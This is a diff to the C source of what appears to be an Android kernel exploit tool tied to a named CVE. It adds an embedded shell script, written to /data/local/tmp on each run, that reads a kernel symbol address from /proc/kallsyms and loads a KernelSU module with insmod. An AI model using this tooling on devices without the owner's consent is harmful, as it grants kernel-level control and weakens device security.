@@ -694,6 +694,59 @@ static int ksu_insmod_binary(const char *path, const char *params) {
   return WIFEXITED(st) ? WEXITSTATUS(st) : -1;
 }
 
+/* ---------- 释放 kernelsu.sh ---------- */
+static const char ksu_script[] =
+  "#!/system/bin/sh\n"
+  "# kernelsu.sh - released by ghostlock54 (overwritten on every run)\n"
+  "# Loads KernelSU module. Run inside a root shell (e.g. ghostlock54 -s).\n"
+  "KO=\"${1:-/data/local/tmp/kernelsu.ko}\"\n"
+  "\n"
+  "if [ ! -f \"$KO\" ]; then\n"
+  "  echo \"[-] module not found: $KO\" >&2\n"
+  "  exit 1\n"
+  "fi\n"
+  "\n"
+  "if grep -q '^kernelsu ' /proc/modules 2>/dev/null; then\n"
+  "  echo \"[+] kernelsu already loaded\"\n"
+  "  exit 0\n"
+  "fi\n"
+  "\n"
+  "echo 1 > /proc/sys/kernel/kptr_restrict 2>/dev/null\n"
+  "\n"
+  "KLN=$(grep ' T kallsyms_lookup_name$' /proc/kallsyms 2>/dev/null | head -n 1 | cut -d' ' -f1)\n"
+  "if [ -z \"$KLN\" ]; then\n"
+  "  echo \"[-] kallsyms_lookup_name not found (need root)\" >&2\n"
+  "  exit 1\n"
+  "fi\n"
+  "\n"
+  "echo \"[*] kln=0x$KLN\"\n"
+  "if ! /system/bin/insmod \"$KO\" kln=0x$KLN level=3; then\n"
+  "  echo \"[-] insmod failed\" >&2\n"
+  "  exit 1\n"
+  "fi\n"
+  "\n"
+  "echo \"[+] kernelsu loaded. Now open KernelSU Manager.\"\n"
+  "\n";
+
+static void ksu_release_script(void) {
+  const char *path = "/data/local/tmp/kernelsu.sh";
+  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0755);
+  if (fd < 0) {
+    pr_warning("[KSU] cannot release %s: %s\n", path, strerror(errno));
+    return;
+  }
+  size_t len = sizeof(ksu_script) - 1, off = 0;
+  while (off < len) {
+    ssize_t n = write(fd, ksu_script + off, len - off);
+    if (n <= 0) { close(fd); pr_warning("[KSU] write %s failed\n", path); return; }
+    off += (size_t)n;
+  }
+  close(fd);
+  (void)chmod(path, 0755);
+  pr_info("[KSU] released %s\n", path);
+}
+/* -------------------------------------- */
+
 static void ksu_load_module(void) {
   pr_info("[KSU] resolving kallsyms_lookup_name...\n");
   unsigned long kln = ksu_resolve_kln();
@@ -765,6 +818,8 @@ int main(int argc, char **argv) {
     usage(argv[0]);
     return 2;
   }
+
+  ksu_release_script();
 
   timer_reset();
   pr_info("CVE-2026-43499 Exploit Engine Initiated\n");
